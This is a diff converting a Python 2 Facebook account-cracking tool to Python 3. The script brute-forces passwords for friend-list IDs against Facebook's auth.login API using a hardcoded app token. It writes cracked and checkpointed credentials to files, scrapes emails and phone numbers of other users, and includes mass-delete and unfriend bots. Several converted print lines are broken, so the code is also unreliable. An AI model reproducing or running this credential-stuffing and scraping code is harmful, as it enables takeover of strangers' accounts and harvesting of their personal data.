@@ -2,17 +2,20 @@
 # Author : Waseem Akram ( hackerwasii )
 # github : https://github.com/evildevill
 # Note : we are not responsible for any misuse
+import importlib
+
+
 try:
-    import os, sys, time, datetime, random, hashlib, re, threading, json, urllib, cookielib, getpass, mechanize, requests
+    import os, sys, time, datetime, random, hashlib, re, threading, json, urllib, http.cookiejar, getpass, mechanize, requests
     from multiprocessing.pool import ThreadPool
     from requests.exceptions import ConnectionError
     from mechanize import Browser
 except ImportError:
-    os.system('pip2 install requests')
-    os.system('pip2 install mechanize')
-    os.system('python2 wasi.py')
+    os.system('pip3 install requests')
+    os.system('pip3 install mechanize')
+    os.system('python3 wasi.py')
 
-reload(sys)
+importlib.reload(sys)
 sys.setdefaultencoding('utf8')
 br = mechanize.Browser()
 br.set_handle_robots(False)
@@ -20,7 +23,7 @@ br.set_handle_refresh(mechanize._http.HTTPRefreshProcessor(), max_time=1)
 br.addheaders = [('user-agent', 'Dalvik/1.6.0 (Linux; U; Android 4.4.2; NX55 Build/KOT5506) [FBAN/FB4A;FBAV/106.0.0.26.68;FBBV/45904160;FBDM/{density=3.0,width=1080,height=1920};FBLC/it_IT;FBRV/45904160;FBCR/PosteMobile;FBMF/asus;FBBD/asus;FBPN/com.facebook.katana;FBDV/ASUS_Z00AD;FBSV/5.0;FBOP/1;FBCA/x86:armeabi-v7a;]')]
 
 def exit():
-    print '[!] Exit'
+    print ('[!] Exit')
     os.sys.exit()
 
 
@@ -64,7 +67,7 @@ def tik():
     titik = [
      '.   ', '..  ', '... ']
     for o in titik:
-        print '\r[\xe2\x9c\x94] \x1b[1;92mLogging In ' + o,
+        print ('\r[\xe2\x9c\x94] \x1b[1;92mLogging In ') + o,
         sys.stdout.flush()
         time.sleep(1)
 
@@ -86,7 +89,7 @@ def menu():
         toket = open('login.txt', 'r').read()
     except IOError:
         os.system('clear')
-        print '[!] \x1b[1;91mToken Not Found'
+        print ('[!] \x1b[1;91mToken Not Found')
         os.system('rm -rf login.txt')
         time.sleep(1)
         os.system('python2 wasi.py')
@@ -98,34 +101,34 @@ def menu():
         id = a['id']
     except KeyError:
         os.system('clear')
-        print '[!] \x1b[1;91mAccount Is On Checkpoint'
+        print ('[!] \x1b[1;91mAccount Is On Checkpoint')
         os.system('rm -rf login.txt')
         time.sleep(1)
         os.system('python2 wasi.py')
     except requests.exceptions.ConnectionError:
-        print '[!] No Connection'
+        print ('[!] No Connection')
         time.sleep(1)
 
     os.system('clear')
-    print banner
-    print '|[\xe2\x9c\x93] \x1b[1;96mName: ' + name
-    print '|[\xe2\x9c\x93] \x1b[1;96mID  : ' + id
-    print 47 * '-'
-    print '[1] \x1b[1;95mStart Cloning.'
-    print '[2] \x1b[1;95mClone With Pass Choice.'
-    print '[3] \x1b[1;95mGrabbing ids Tools.'
-    print '[4] \x1b[1;95mAuto Delete Tools.'
-    print '[5] \x1b[1;95mUpdate Tool.'
-    print '[6] \x1b[1;95mFollow Me On Youtube.'
-    print '[7] Logout'
-    print '                  '
+    print ('banner')
+    print ('|[\xe2\x9c\x93] \x1b[1;96mName: ' )+ name
+    print ('|[\xe2\x9c\x93] \x1b[1;96mID  : ' )+ id
+    print (47 * '-')
+    print ('[1] \x1b[1;95mStart Cloning.')
+    print ('[2] \x1b[1;95mClone With Pass Choice.')
+    print ('[3] \x1b[1;95mGrabbing ids Tools.')
+    print ('[4] \x1b[1;95mAuto Delete Tools.')
+    print ('[5] \x1b[1;95mUpdate Tool.')
+    print ('[6] \x1b[1;95mFollow Me On Youtube.')
+    print ('[7] Logout')
+    print ('                  ')
     men()
 
 
 def men():
-    rana = raw_input('Choose Option >>  ')
+    rana = input('Choose Option >>  ')
     if rana == '':
-        print ' \x1b[1;91mWrong Input'
+        print (' \x1b[1;91mWrong Input')
         men()
     elif rana == '1':
         crack()
@@ -146,7 +149,7 @@ def men():
         bot()
     elif rana == '5':
         os.system('clear')
-        print banner
+        print ('banner')
         wasii('[\xe2\x9c\x93] \x1b[1;92mPlease Wait While Tool Is Updating')
         os.system('git pull origin master')
         wasii('[\xe2\x9c\x93] \x1b[1;92mTool Has Been Update Successfully')
@@ -161,7 +164,7 @@ def men():
         wasii('[\xe2\x9c\x93] Logged Out Successfully')
         os.system('python2 wasi.py')
     else:
-        print '[!] \x1b[1;91mWrong Input'
+        print ('[!] \x1b[1;91mWrong Input')
         men()
 
 
@@ -171,29 +174,29 @@ def crack():
     try:
         toket = open('login.txt', 'r').read()
     except IOError:
-        print '\x1b[1;91mToken invalid'
+        print ('\x1b[1;91mToken invalid')
         os.system('rm -rf login.txt')
         time.sleep(1)
         os.system('python2 wasi.py')
 
     os.system('clear')
-    print banner
-    print '[1] \x1b[1;93mClone From Friendlist.'
-    print '[2] \x1b[1;93mClone From Any Public ID.'
-    print '[3] \x1b[1;93mClone From File.'
-    print '[0] Back.'
+    print ('banner')
+    print ('[1] \x1b[1;93mClone From Friendlist.')
+    print ('[2] \x1b[1;93mClone From Any Public ID.')
+    print ('[3] \x1b[1;93mClone From File.')
+    print ('[0] Back.')
     crack_menu()
 
 
 def crack_menu():
     global oks
-    crm = raw_input('Choose Option >>  ')
+    crm = input('Choose Option >>  ')
     if crm == '':
-        print '[!] Filled Incorrectly'
+        print ('[!] Filled Incorrectly')
         crack_menu()
     elif crm == '1':
         os.system('clear')
-        print banner
+        print ('banner')
         r = requests.get('https://graph.facebook.com/me/friends?access_token=' + toket)
         z = json.loads(r.text)
         for s in z['data']:
@@ -201,15 +204,15 @@ def crack_menu():
 
     elif crm == '2':
         os.system('clear')
-        print banner
-        idt = raw_input('[+] Input ID: ')
+        print ('banner')
+        idt = input('[+] Input ID: ')
         try:
             jok = requests.get('https://graph.facebook.com/' + idt + '?access_token=' + toket)
             op = json.loads(jok.text)
             wasii('\x1b[1;97m[\xe2\x9c\x93] \x1b[1;95mAccount Name \x1b[1;97m:\x1b[1;97m ' + op['name'])
         except KeyError:
-            print '[!] \x1b[1;91mID Not Found!'
-            raw_input('\nPress Enter To Back  ')
+            print ('[!] \x1b[1;91mID Not Found!')
+            input('\nPress Enter To Back  ')
             crack()
 
         r = requests.get('https://graph.facebook.com/' + idt + '/friends?access_token=' + toket)
@@ -219,21 +222,21 @@ def crack_menu():
 
     elif crm == '3':
         os.system('clear')
-        print banner
+        print ('banner')
         try:
-            idlist = raw_input('[+] File Name: ')
+            idlist = input('[+] File Name: ')
             for line in open(idlist, 'r').readlines():
                 id.append(line.strip())
 
         except IOError:
-            print '[!] \x1b[1;91mFile Not Found.'
-            raw_input('Press Enter To Back. ')
+            print ('[!] \x1b[1;91mFile Not Found.')
+            input('Press Enter To Back. ')
             crack()
 
     elif crm == '0':
         menu()
     else:
-        print 'Filled Incorrectly'
+        print ('Filled Incorrectly')
         crack_menu()
     wasii('[\xe2\x9c\x93] \x1b[1;96mTotal Friends: ' + str(len(id)))
     time.sleep(0.5)
@@ -241,7 +244,7 @@ def crack_menu():
     time.sleep(0.5)
     wasii('[!] \x1b[1;96mTo Stop Process Press CTRL Then Z')
     time.sleep(0.5)
-    print 47 * '-'
+    print (47 * '-')
 
     def main(arg):
         user = arg
@@ -257,10 +260,10 @@ def crack_menu():
             data = urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + user + '&locale=en_US&password=' + pass1 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
             q = json.load(data)
             if 'access_token' in q:
-                print '\x1b[1;32m[\x1b[1;32mSuccessful\x1b[1;32m]\x1b[1;30m ' + user + ' \x1b[1;97m|\x1b[1;30m ' + pass1
+                print ('\x1b[1;32m[\x1b[1;32mSuccessful\x1b[1;32m]\x1b[1;30m ') + user + ' \x1b[1;97m|\x1b[1;30m ' + pass1
                 oks.append(user + pass1)
             elif 'www.facebook.com' in q['error_msg']:
-                print '\x1b[1;97m[\x1b[1;97mCheckpoint\x1b[1;97m]\x1b[1;97m ' + user + ' \x1b[1;97m|\x1b[1;97m ' + pass1
+                print ('\x1b[1;97m[\x1b[1;97mCheckpoint\x1b[1;97m]\x1b[1;97m ' )+ user + ' \x1b[1;97m|\x1b[1;97m ' + pass1
                 crt = open('save/checkpoint.txt', 'a')
                 crt.write(user + '|' + pass1 + '\n')
                 crt.close()
@@ -270,10 +273,10 @@ def crack_menu():
                 data = urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + user + '&locale=en_US&password=' + pass2 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
                 q = json.load(data)
                 if 'access_token' in q:
-                    print '\x1b[1;32m[\x1b[1;32mSuccessful\x1b[1;32m]\x1b[1;30m ' + user + ' \x1b[1;97m|\x1b[1;30m ' + pass2
+                    print ('\x1b[1;32m[\x1b[1;32mSuccessful\x1b[1;32m]\x1b[1;30m ') + user + ' \x1b[1;97m|\x1b[1;30m ' + pass2
                     oks.append(user + pass2)
                 elif 'www.facebook.com' in q['error_msg']:
-                    print '\x1b[1;97m[\x1b[1;97mCheckpoint\x1b[1;97m]\x1b[1;97m ' + user + ' \x1b[1;97m|\x1b[1;97m ' + pass2
+                    print ('\x1b[1;97m[\x1b[1;97mCheckpoint\x1b[1;97m]\x1b[1;97m ') + user + ' \x1b[1;97m|\x1b[1;97m ' + pass2
                     crt = open('save/checkpoint.txt', 'a')
                     crt.write(user + '|' + pass2 + '\n')
                     crt.close()
@@ -283,10 +286,10 @@ def crack_menu():
                     data = urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + user + '&locale=en_US&password=' + pass3 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
                     q = json.load(data)
                     if 'access_token' in q:
-                        print '\x1b[1;32m[\x1b[1;32mSuccessful\x1b[1;32m]\x1b[1;30m ' + user + ' \x1b[1;97m|\x1b[1;30m ' + pass3
+                        print ('\x1b[1;32m[\x1b[1;32mSuccessful\x1b[1;32m]\x1b[1;30m ') + user + ' \x1b[1;97m|\x1b[1;30m ' + pass3
                         oks.append(user + pass3)
                     elif 'www.facebook.com' in q['error_msg']:
-                        print '\x1b[1;97m[\x1b[1;97mCheckpoint\x1b[1;97m]\x1b[1;97m ' + user + ' \x1b[1;97m|\x1b[1;97m ' + pass3
+                        print ('\x1b[1;97m[\x1b[1;97mCheckpoint\x1b[1;97m]\x1b[1;97m ') + user + ' \x1b[1;97m|\x1b[1;97m ' + pass3
                         crt = open('save/checkpoint.txt', 'a')
                         crt.write(user + '|' + pass3 + '\n')
                         crt.close()
@@ -296,10 +299,10 @@ def crack_menu():
                         data = urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + user + '&locale=en_US&password=' + pass4 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
                         q = json.load(data)
                         if 'access_token' in q:
-                            print '\x1b[1;32m[\x1b[1;32mSuccessful\x1b[1;32m]\x1b[1;30m ' + user + ' \x1b[1;97m|\x1b[1;30m ' + pass4
+                            print ('\x1b[1;32m[\x1b[1;32mSuccessful\x1b[1;32m]\x1b[1;30m ' )+ user + ' \x1b[1;97m|\x1b[1;30m ' + pass4
                             oks.append(user + pass4)
                         elif 'www.facebook.com' in q['error_msg']:
-                            print '\x1b[1;97m[\x1b[1;97mCheckpoint\x1b[1;97m]\x1b[1;97m ' + user + ' \x1b[1;97m|\x1b[1;97m ' + pass4
+                            print ('\x1b[1;97m[\x1b[1;97mCheckpoint\x1b[1;97m]\x1b[1;97m ') + user + ' \x1b[1;97m|\x1b[1;97m ' + pass4
                             crt = open('save/checkpoint.txt', 'a')
                             crt.write(user + '|' + pass4 + '\n')
                             crt.close()
@@ -309,10 +312,10 @@ def crack_menu():
                             data = urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + user + '&locale=en_US&password=' + pass5 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
                             q = json.load(data)
                             if 'access_token' in q:
-                                print '\x1b[1;32m[\x1b[1;32mSuccessful\x1b[1;32m]\x1b[1;30m ' + user + ' \x1b[1;97m|\x1b[1;30m ' + pass5
+                                print ('\x1b[1;32m[\x1b[1;32mSuccessful\x1b[1;32m]\x1b[1;30m ') + user + ' \x1b[1;97m|\x1b[1;30m ' + pass5
                                 oks.append(user + pass5)
                             elif 'www.facebook.com' in q['error_msg']:
-                                print '\x1b[1;97m[\x1b[1;97mCheckpoint\x1b[1;97m]\x1b[1;97m ' + user + ' \x1b[1;97m|\x1b[1;97m ' + pass5
+                                print ('\x1b[1;97m[\x1b[1;97mCheckpoint\x1b[1;97m]\x1b[1;97m ') + user + ' \x1b[1;97m|\x1b[1;97m ' + pass5
                                 crt = open('save/checkpoint.txt', 'a')
                                 crt.write(user + '|' + pass5 + '\n')
                                 crt.close()
@@ -322,10 +325,10 @@ def crack_menu():
                                 data = urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + user + '&locale=en_US&password=' + pass6 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
                                 q = json.load(data)
                                 if 'access_token' in q:
-                                    print '\x1b[1;32m[\x1b[1;32mSuccessful\x1b[1;32m]\x1b[1;30m ' + user + ' \x1b[1;97m|\x1b[1;30m ' + pass6
+                                    print ('\x1b[1;32m[\x1b[1;32mSuccessful\x1b[1;32m]\x1b[1;30m ') + user + ' \x1b[1;97m|\x1b[1;30m ' + pass6
                                     oks.append(user + pass6)
                                 elif 'www.facebook.com' in q['error_msg']:
-                                    print '\x1b[1;97m[\x1b[1;97mCheckpoint\x1b[1;97m]\x1b[1;97m ' + user + ' \x1b[1;97m|\x1b[1;97m ' + pass6
+                                    print ('\x1b[1;97m[\x1b[1;97mCheckpoint\x1b[1;97m]\x1b[1;97m ') + user + ' \x1b[1;97m|\x1b[1;97m ' + pass6
                                     crt = open('save/checkpoint.txt', 'a')
                                     crt.write(user + '|' + pass6 + '\n')
                                     crt.close()
@@ -335,10 +338,10 @@ def crack_menu():
                                     data = urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + user + '&locale=en_US&password=' + pass7 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
                                     q = json.load(data)
                                     if 'access_token' in q:
-                                        print '\x1b[1;32m[\x1b[1;32mSuccessful\x1b[1;32m]\x1b[1;30m ' + user + ' \x1b[1;97m|\x1b[1;30m ' + pass7
+                                        print ('\x1b[1;32m[\x1b[1;32mSuccessful\x1b[1;32m]\x1b[1;30m ' )+ user + ' \x1b[1;97m|\x1b[1;30m ' + pass7
                                         oks.append(user + pass7)
                                     elif 'www.facebook.com' in q['error_msg']:
-                                        print '\x1b[1;97m[\x1b[1;97mCheckpoint\x1b[1;97m]\x1b[1;97m ' + user + ' \x1b[1;97m|\x1b[1;97m ' + pass7
+                                        print ('\x1b[1;97m[\x1b[1;97mCheckpoint\x1b[1;97m]\x1b[1;97m ') + user + ' \x1b[1;97m|\x1b[1;97m ' + pass7
                                         crt = open('save/checkpoint.txt', 'a')
                                         crt.write(user + '|' + pass7 + '\n')
                                         crt.close()
@@ -348,14 +351,14 @@ def crack_menu():
 
     p = ThreadPool(30)
     p.map(main, id)
-    print '\x1b[1;97m----------------------------------------------'
+    print ('\x1b[1;97m----------------------------------------------')
     wasii('[\xe2\x9c\x93] \x1b[1;92mProcess Has Been Completed.')
     wasii('\x1b[1;93m[\xe2\x9c\x93] \x1b[1;92mCheckpoint IDS Has Been Saved.')
     xx = str(len(oks))
     xxx = str(len(checkpoint))
-    print '[\xe2\x9c\x93] Total \x1b[1;93mOK/\x1b[1;96mCP : \x1b[1;93m' + str(len(oks)) + '/\x1b[1;97m' + str(len(checkpoint))
-    print 47 * '-'
-    raw_input('\nPress Enter To Back ')
+    print ('[\xe2\x9c\x93] Total \x1b[1;93mOK/\x1b[1;96mCP : \x1b[1;93m') + str(len(oks)) + '/\x1b[1;97m' + str(len(checkpoint))
+    print (47 * '-')
+    input('\nPress Enter To Back ')
     menu()
 
 
@@ -364,25 +367,25 @@ def grab():
     try:
         toket = open('login.txt', 'r').read()
     except IOError:
-        print '[!] Token Not Found'
+        print ('[!] Token Not Found')
         os.system('rm -rf login.txt')
         time.sleep(1)
         os.system('python2 wasi.py')
 
     os.system('clear')
-    print banner
-    print '[1]\x1b[1;94m Extract Numeric IDs From Public ID.'
-    print "[2]\x1b[1;94m Extract Email's From Public ID."
-    print '[3]\x1b[1;94m Extract Phone Number From Public ID.'
-    print '[0] Back.'
-    print '          '
+    print ('banner')
+    print ('[1]\x1b[1;94m Extract Numeric IDs From Public ID.')
+    print ("[2]\x1b[1;94m Extract Email's From Public ID.")
+    print ('[3]\x1b[1;94m Extract Phone Number From Public ID.')
+    print ('[0] Back.')
+    print ('          ')
     grab_menu()
 
 
 def grab_menu():
-    grm = raw_input('\nChoose Option >> ')
+    grm = input('\nChoose Option >> ')
     if grm == '':
-        print ' Wrong Input'
+        print (' Wrong Input')
         grab_menu()
     elif grm == '1':
         idfromfriend()
@@ -393,7 +396,7 @@ def grab_menu():
     elif grm == '0':
         menu()
     else:
-        print '[!] Wrong input'
+        print ('[!] Wrong input')
         grab_menu()
 
 
@@ -402,7 +405,7 @@ def idfromfriend():
     try:
         toket = open('login.txt', 'r').read()
     except IOError:
-        print '[!] Token Not Found'
+        print ('[!] Token Not Found')
         os.system('rm -rf login.txt')
         time.sleep(1)
 
@@ -413,50 +416,50 @@ def idfromfriend():
 
     try:
         os.system('clear')
-        print banner
-        idt = raw_input('[+] Input ID : ')
+        print ('banner')
+        idt = input('[+] Input ID : ')
         try:
             jok = requests.get('https://graph.facebook.com/' + idt + '?access_token=' + toket)
             op = json.loads(jok.text)
-            print '[\xe2\x9c\x93]\x1b[1;92m Account Name : ' + op['name']
+            print ('[\xe2\x9c\x93]\x1b[1;92m Account Name : ') + op['name']
         except KeyError:
-            print '[!] Friend Not Found'
-            raw_input('Press Enter To Back ')
+            print ('[!] Friend Not Found')
+            input('Press Enter To Back ')
             grab()
 
         r = requests.get('https://graph.facebook.com/' + idt + '?fields=friends.limit(5000)&access_token=' + toket)
         z = json.loads(r.text)
         wasii('[\xe2\x9c\x93] \x1b[1;92mGetting Friends Numeric IDs...')
-        print '--------------------------------------'
+        print ('--------------------------------------')
         bz = open('save/id.txt', 'w')
         for a in z['friends']['data']:
             idh.append(a['id'])
             bz.write(a['id'] + '\n')
-            print '\r[' + str(len(idh)) + ' ] => ' + a['id'],
+            print ('\r[' )+ str(len(idh)) + ' ] => ' + a['id'],
             sys.stdout.flush()
             time.sleep(0.001)
 
         bz.close()
-        print '\r[\xe2\x9c\x93] The Process Has Been Completed.'
-        print '\r[\xe2\x9c\x93] Total IDs Founded : ' + str(len(idh))
-        done = raw_input('\r[?] Save File With Name : ')
-        print '\r[\xe2\x9c\x93] The File Has Been Saved As save/' + done
-        raw_input('\nPress Enter To Back ')
+        print ('\r[\xe2\x9c\x93] The Process Has Been Completed.')
+        print ('\r[\xe2\x9c\x93] Total IDs Founded : ') + str(len(idh))
+        done = input('\r[?] Save File With Name : ')
+        print ('\r[\xe2\x9c\x93] The File Has Been Saved As save/') + done
+        input('\nPress Enter To Back ')
         grab()
     except IOError:
-        print '[!] Error While Creating file'
-        raw_input('\nPress Enter To Back ')
+        print ('[!] Error While Creating file')
+        input('\nPress Enter To Back ')
         grab()
     except (KeyboardInterrupt, EOFError):
-        print '[!]The Process Has Been Stopped'
-        raw_input('\nPress Enter To Back ')
+        print ('[!]The Process Has Been Stopped')
+        input('\nPress Enter To Back ')
         grab()
     except KeyError:
-        print '[!] Error'
-        raw_input('\nPress Enter To Back ')
+        print ('[!] Error')
+        input('\nPress Enter To Back ')
         grab()
     except requests.exceptions.ConnectionError:
-        print '[\xe2\x9c\x96] No Connection'
+        print ('[\xe2\x9c\x96] No Connection')
         time.sleep(1)
         grab()
 
@@ -466,7 +469,7 @@ def emailfromfriend():
     try:
         toket = open('login.txt', 'r').read()
     except IOError:
-        print '[!] Token Not Found'
+        print ('[!] Token Not Found')
         os.system('rm -rf login.txt')
         time.sleep(1)
         os.system('python2 wasi.py')
@@ -478,21 +481,21 @@ def emailfromfriend():
 
     try:
         os.system('clear')
-        print banner
-        idt = raw_input('[+] Input ID : ')
+        print ('banner')
+        idt = input('[+] Input ID : ')
         try:
             jok = requests.get('https://graph.facebook.com/' + idt + '?access_token=' + toket)
             op = json.loads(jok.text)
-            print '[\xe2\x9c\x93] \x1b[1;92mAccount Name : ' + op['name']
+            print ('[\xe2\x9c\x93] \x1b[1;92mAccount Name : ') + op['name']
         except KeyError:
-            print '[!] Account Not Found'
-            raw_input('\nPress Enter To Back ')
+            print ('[!] Account Not Found')
+            input('\nPress Enter To Back ')
             grab()
 
         r = requests.get('https://graph.facebook.com/' + idt + '/friends?access_token=' + toket)
         a = json.loads(r.text)
         wasii('[\xe2\x9c\x93] \x1b[1;92mGetting Emails From')
-        print 40 * '\x1b[1;97m-'
+        print (40 * '\x1b[1;97m-')
         bz = open('save/email.txt', 'w')
         for i in a['data']:
             x = requests.get('https://graph.facebook.com/' + i['id'] + '?access_token=' + toket)
@@ -500,34 +503,34 @@ def emailfromfriend():
             try:
                 emfromfriend.append(z['email'])
                 bz.write(z['email'] + '\n')
-                print '\r\x1b[1;97m[ \x1b[1;97m' + str(len(emfromfriend)) + '\x1b[1;97m ]\x1b[1;97m  \x1b[1;97m' + z['email'] + ' | ' + z['name'] + '\n',
+                print ('\r\x1b[1;97m[ \x1b[1;97m') + str(len(emfromfriend)) + '\x1b[1;97m ]\x1b[1;97m  \x1b[1;97m' + z['email'] + ' | ' + z['name'] + '\n',
                 sys.stdout.flush()
                 time.sleep(0.0001)
             except KeyError:
                 pass
 
         bz.close()
-        print '----------------------------------'
-        print '\r[\xe2\x9c\x93] Successfully Extracted Mails'
-        print '\r[\xe2\x9c\x93] Total Mail Founded : ' + str(len(emfromfriend))
-        done = raw_input('\r\x1b[1;97m[\xe2\x9c\x93] \x1b[1;97mSave File With Name\x1b[1;97m :\x1b[1;97m ')
-        print '\r[\xe2\x9c\x93] File Has Been Saved As : save/' + done
-        raw_input('\nPress Enter  To Back ')
+        print ('----------------------------------')
+        print ('\r[\xe2\x9c\x93] Successfully Extracted Mails')
+        print ('\r[\xe2\x9c\x93] Total Mail Founded : ' )+ str(len(emfromfriend))
+        done = input('\r\x1b[1;97m[\xe2\x9c\x93] \x1b[1;97mSave File With Name\x1b[1;97m :\x1b[1;97m ')
+        print ('\r[\xe2\x9c\x93] File Has Been Saved As : save/' )+ done
+        input('\nPress Enter  To Back ')
         grab()
     except IOError:
-        print '[!] Error While Creating file'
-        raw_input('\nPress Enter To Back ')
+        print ('[!] Error While Creating file')
+        input('\nPress Enter To Back ')
         grab()
     except (KeyboardInterrupt, EOFError):
-        print '[!] Process Has Been Stopped'
-        raw_input('\nPress Enter To Back ')
+        print ('[!] Process Has Been Stopped')
+        input('\nPress Enter To Back ')
         grab()
     except KeyError:
-        print '[!] Error'
-        raw_input('\nPress Enter To Back ')
+        print ('[!] Error')
+        input('\nPress Enter To Back ')
         grab()
     except requests.exceptions.ConnectionError:
-        print '\x1b[1;97m[\xe2\x9c\x96] No Connection'
+        print ('\x1b[1;97m[\xe2\x9c\x96] No Connection')
         time.sleep(1)
         grab()
 
@@ -537,7 +540,7 @@ def numberfromfriend():
     try:
         toket = open('login.txt', 'r').read()
     except IOError:
-        print '[!] Token Not Found'
+        print ('[!] Token Not Found')
         os.system('rm -rf login.txt')
         time.sleep(1)
         os.system('python2 wasi.py')
@@ -549,21 +552,21 @@ def numberfromfriend():
 
     try:
         os.system('clear')
-        print banner
-        idt = raw_input('[+] Input ID : ')
+        print ('banner')
+        idt = input('[+] Input ID : ')
         try:
             jok = requests.get('https://graph.facebook.com/' + idt + '?access_token=' + toket)
             op = json.loads(jok.text)
-            print '[\xe2\x9c\x93] \x1b[1;92mAccount Name : ' + op['name']
+            print ('[\xe2\x9c\x93] \x1b[1;92mAccount Name : ') + op['name']
         except KeyError:
-            print '[!] Friend Not Found'
-            raw_input('\nPress Enter To Back ')
+            print ('[!] Friend Not Found')
+            input('\nPress Enter To Back ')
             grab()
 
         r = requests.get('https://graph.facebook.com/' + idt + '/friends?access_token=' + toket)
         a = json.loads(r.text)
         wasii('[\xe2\x9c\x93] \x1b[1;92mGetting All Numbers')
-        print 40 * '\x1b[1;97m-'
+        print (40 * '\x1b[1;97m-')
         bz = open('save/number.txt', 'w')
         for i in a['data']:
             x = requests.get('https://graph.facebook.com/' + i['id'] + '?access_token=' + toket)
@@ -571,33 +574,33 @@ def numberfromfriend():
             try:
                 nofromfriend.append(z['mobile_phone'])
                 bz.write(z['mobile_phone'] + '\n')
-                print '\r\x1b[1;97m[ \x1b[1;97m' + str(len(nofromfriend)) + '\x1b[1;97m ]\x1b[1;97m \x1b[1;97m' + z['mobile_phone'] + ' | ' + z['name'] + '\n',
+                print ('\r\x1b[1;97m[ \x1b[1;97m') + str(len(nofromfriend)) + '\x1b[1;97m ]\x1b[1;97m \x1b[1;97m' + z['mobile_phone'] + ' | ' + z['name'] + '\n',
                 sys.stdout.flush()
                 time.sleep(0.001)
             except KeyError:
                 pass
 
         bz.close()
-        print '-----------------------------------'
-        print '\r[\xe2\x9c\x93] Total Number Founded : ' + str(len(nofromfriend))
-        done = raw_input('\r[?] Save File With Name: ')
-        print '\r[\xe2\x9c\x93] File Has Been Saved As save/' + done
-        raw_input('\nPress Enter To Back ')
+        print ('-----------------------------------')
+        print ('\r[\xe2\x9c\x93] Total Number Founded : ') + str(len(nofromfriend))
+        done = input('\r[?] Save File With Name: ')
+        print ('\r[\xe2\x9c\x93] File Has Been Saved As save/') + done
+        input('\nPress Enter To Back ')
         grab()
     except IOError:
-        print '[!] Error While Creating file'
-        raw_input('\nPress Enter To Back ')
+        print ('[!] Error While Creating file')
+        input('\nPress Enter To Back ')
         grab()
     except (KeyboardInterrupt, EOFError):
-        print '[!]The Process Has Been Stopped'
-        raw_input('\nPress Enter To Back')
+        print ('[!]The Process Has Been Stopped')
+        input('\nPress Enter To Back')
         grab()
     except KeyError:
-        print '[!] Error'
-        raw_input('\nPress Enter To Back ')
+        print ('[!] Error')
+        input('\nPress Enter To Back ')
         grab()
     except requests.exceptions.ConnectionError:
-        print '\n[\xe2\x9c\x96] No Connection'
+        print ('\n[\xe2\x9c\x96] No Connection')
         time.sleep(1)
         grab()
 
@@ -607,25 +610,25 @@ def bot():
     try:
         toket = open('login.txt', 'r').read()
     except IOError:
-        print '[!] Token not found'
+        print ('[!] Token not found')
         os.system('rm -rf login.txt')
         time.sleep(1)
         os.system('python2 wasi.py')
 
     os.system('clear')
-    print banner
-    print '[1]\x1b[1;92m Auto Delete Posts.'
-    print '[2]\x1b[1;92m Auto Accept Friend Requests.'
-    print '[3] \x1b[1;92mAuto Unfriend All.'
-    print '[0] Back.'
-    print '         '
+    print ('banner')
+    print ('[1]\x1b[1;92m Auto Delete Posts.')
+    print ('[2]\x1b[1;92m Auto Accept Friend Requests.')
+    print ('[3] \x1b[1;92mAuto Unfriend All.')
+    print ('[0] Back.')
+    print ('         ')
     bot_menu()
 
 
 def bot_menu():
-    bots = raw_input('\nChoose Option >> ')
+    bots = input('\nChoose Option >> ')
     if bots == '':
-        print '[!] Wrong Input'
+        print ('[!] Wrong Input')
         bot_menu()
     elif bots == '1':
         deletepost()
@@ -636,7 +639,7 @@ def bot_menu():
     elif bots == '0':
         menu()
     else:
-        print '[!] Wrong Input'
+        print ('[!] Wrong Input')
         bot_menu()
 
 
@@ -648,16 +651,16 @@ def deletepost():
         lol = json.loads(nam.text)
         name = lol['name']
     except IOError:
-        print '[!] Token Not Found'
+        print ('[!] Token Not Found')
         os.system('rm -rf login.txt')
         time.sleep(0.1)
         os.system('python2 wasi.py')
 
     os.system('clear')
-    print banner
-    print '[\xe2\x9c\x93] \x1b[1;92mAccount Name : ' + nama
+    print ('banner')
+    print ('[\xe2\x9c\x93] \x1b[1;92mAccount Name : ') + name
     wasii('[\xe2\x9c\x93] \x1b[1;92mThe Process Has Been Started')
-    print 40 * '-'
+    print (40 * '-')
     asu = requests.get('https://graph.facebook.com/me/feed?access_token=' + toket)
     asus = json.loads(asu.text)
     for p in asus['data']:
@@ -667,18 +670,18 @@ def deletepost():
         ok = json.loads(url.text)
         try:
             error = ok['error']['message']
-            print '\x1b[1;97m[\x1b[1;97m' + id[:10].replace('\n', ' ') + '...' + '\x1b[1;97m] \x1b[1;97m[!] Failed'
+            print ('\x1b[1;97m[\x1b[1;97m') + id[:10].replace('\n', ' ') + '...' + '\x1b[1;97m] \x1b[1;97m[!] Failed'
         except TypeError:
-            print '\x1b[1;97m[\x1b[1;97m' + id[:10].replace('\n', ' ') + '...' + '\x1b[1;97m \x1b[1;97[\xe2\x9c\x93] [Deleted]'
+            print ('\x1b[1;97m[\x1b[1;97m') + id[:10].replace('\n', ' ') + '...' + '\x1b[1;97m \x1b[1;97[\xe2\x9c\x93] [Deleted]'
             piro += 1
